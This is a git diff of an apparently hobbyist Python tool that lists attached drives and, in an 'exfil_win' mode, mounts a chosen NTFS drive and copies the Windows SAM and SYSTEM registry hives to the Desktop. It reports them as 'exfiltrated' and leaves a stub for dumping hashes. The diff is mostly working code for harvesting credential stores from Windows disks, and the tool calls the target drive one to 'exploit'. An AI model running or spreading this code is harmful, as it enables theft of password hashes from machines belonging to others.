@@ -12,6 +12,7 @@ class Drive:
         # self.target = "/mnt"
         self.fs = ""
         # self.options = "rw"
+        
 
     def set_source(self, source):
         self.source = source
@@ -26,8 +27,14 @@ class Drive:
         return self.fs
     # def get_options(self):
     #     return self.options
-
-
+    def is_mounted(self):
+        proc = subprocess.Popen("sudo mount | column -t", stdout=subprocess.PIPE, shell=True)
+        (mounted_drives, err) = proc.communicate()
+        mounted_drives = mounted_drives.decode('utf-8')     
+        if self.get_source() in mounted_drives:
+            return "yes"
+        else:
+            return "no"
 
 #Run the command sudo blkid and then recieve its output as a bytes
 #Decode using utf-8 and then split on \n
@@ -54,18 +61,14 @@ def mount_drive(drive):
 
 def find_winpayload():
     # gotta use the mount point made by mount_drive here from the user input
-    subprocess.call('cp /media/windows/Windows/System32/config/SAM ~/Desktop/', shell=True)
-    subprocess.call('cp /media/windows/Windows/System32/config/SYSTEM ~/Desktop/', shell=True)
-
-    print('Sytem and Sam registry hives have been succesfully exfiltrated to ~/Desktop')
-
-    subprocess.Popen("sudo umount /media/windows", shell=True)
-    
-    print('Drive has been unmounted from /media/windows')
-
-
     # i should implement some code that suggests a drive to choose based off of mounting other ones and lsing
     # them. This will be slow but very cool
+    subprocess.call('cp /media/windows/Windows/System32/config/SAM ~/Desktop/', shell=True)
+    subprocess.call('cp /media/windows/Windows/System32/config/SYSTEM ~/Desktop/', shell=True)
+    print('\t\t\t\t  Sytem and Sam registry hives have been succesfully exfiltrated to ~/Desktop')
+    time.sleep(1)
+    subprocess.Popen("sudo umount /media/windows", shell=True)
+    print('\t\t\t\t\t\t    Drive has been unmounted from /media/windows')
 
 def store_drives(raw_drives):
     obj_drives = []
@@ -89,64 +92,54 @@ def dump_hashes():
     # domain controller.
     pass
 
-
 def pretty_print(drives):
     apl_drives = linux_drives =  allpurpose_drives = win_drives = []
-  
-    print("\t\t\t    *********************************************************************************************",end ="")
-    print("\n\t\t\t    *****************************A TABLE OF ALL CONNECTED DEVICES********************************",end ="")
+    print("\n\n\t\t\t    *********************************************************************************************",end ="")
+    print("\n\t\t\t    ***********************************A TABLE OF ALL CONNECTED DEVICES**************************",end ="")
     print("\n\t\t\t    *********************************************************************************************",end ="")
-
-    print("\n\t\t\t    *\t\tDrive Location\t\t\tFile System\t\t\tMounted\t\t*",end ="")
-
-    #APFS AND FAT fs are a bit buggy need to fix.
+    print("\n\t\t\t    *\t\tDrive Location\t\t\t  File System\t\t\tMounted\t\t*",end ="")
     for drive in drives:
         if len(drive.get_fs()) > 1:
-            print("\n\t\t\t    *\t\t  {}\t\t\t{}\t\t\t   no\t\t*".format(drive.get_source(), drive.get_fs()), end="")
+            print("\n\t\t\t    *\t\t  {}\t\t\t{}\t\t\t   {}\t\t*".format(drive.get_source(), drive.get_fs(), drive.is_mounted()), end="")
     print("\n\t\t\t    *********************************************************************************************",end ="\n")
-
-
-        
 
 def main():
 
     subprocess.call('cat assets/ascii_art', shell=True)
-
     parser = argparse.ArgumentParser(description='Choose which mode to run program in. No input lists all the storage devices.')
     group = parser.add_mutually_exclusive_group()
     group.add_argument('-w', '--exfil_win', action="store_true")
     args = parser.parse_args()
-    
     drives = grab_drives()
     all_drives = store_drives(drives)
     if args.exfil_win:
         drive_count = 0
         raw_win_drives = locate_winfs(drives)
         win_drives = store_drives(raw_win_drives)
+        #not the happiest with this code but it works
         if len(raw_win_drives) < 1:
             print("no exploitable drives")
         else:
-            print("Conected drives using the NTFS file system.\n")
+            print("\n\t\t\t\t\t\t    Conected drives using the NTFS file system.\n")
             for drive in raw_win_drives:
-                print("Drive {}\n{}\n".format(drive_count, drive))
+                if len(drive) > 69:
+                    print("\t\t\t\t\t\t\t\t     Drive {}\n\t\t\t{}\n".format(drive_count, drive))
+                else:
+                    print("\t\t\t\t\t\t\t\t     Drive {}\n\t\t\t\t\t{}\n".format(drive_count, drive))
+                
                 drive_count += 1
-            target = input("\n========================================================\n please choose a drive to exploit. Note drives start at 0\nDrive ")
-            print("Targeting: " + raw_win_drives[int(target)])
+            target = input("\n\t\t\t\t\t     ========================================================\n\t\t\t\t\t     please choose a drive to exploit. Note drives start at 0\n\n\t\t\t\t\t\t\t\t     Drive ")
+            print("\t\t\t\tTargeting: " + raw_win_drives[int(target)])
             mount_drive(win_drives[int(target)])
             find_winpayload()
     elif not len(sys.argv) > 1:
         pretty_print(all_drives)
-        
     else:
         print("invalid flag")
-
-    # dump_hashes()
- 
 
 if __name__ == '__main__':
     main()
     
-
 
 #pretty print script CHECK
 # 
